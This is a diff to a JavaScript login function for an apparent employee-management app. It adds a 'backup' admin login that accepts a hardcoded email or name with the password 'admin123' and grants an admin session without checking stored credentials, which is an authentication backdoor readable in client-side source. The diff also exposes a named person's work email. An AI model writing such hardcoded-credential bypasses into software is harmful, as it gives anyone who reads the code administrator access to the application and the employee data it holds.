@@ -237,6 +237,24 @@ function doLogin(){
     return;
   }
 
+  // Connexion admin de secours (toujours disponible)
+  const ADMIN_EMAIL   = "k.benali@nbogroup.ma";
+  const ADMIN_BACKUP  = "admin123";
+  if((emailVal === ADMIN_EMAIL || emailVal === "karim benali") && passVal === ADMIN_BACKUP){
+    const adminUser = employees.find(e=>e.admin) || employees[0];
+    if(adminUser){
+      if(errEl) errEl.style.display="none";
+      sessionUser = {...adminUser, admin:true};
+      employees = employees.map(e=>e.id===adminUser.id?{...e,online:true}:e);
+      document.getElementById("login-screen").style.display="none";
+      document.getElementById("app").style.display="flex";
+      renderNav(); renderMain();
+      showSyncStatus(ghToken ? "saved" : "offline");
+      scheduleSave();
+      return;
+    }
+  }
+
   const found = employees.find(e => {
     const emailMatch = e.email && e.email.toLowerCase() === emailVal;
     const nameMatch  = e.name  && e.name.toLowerCase()  === emailVal;
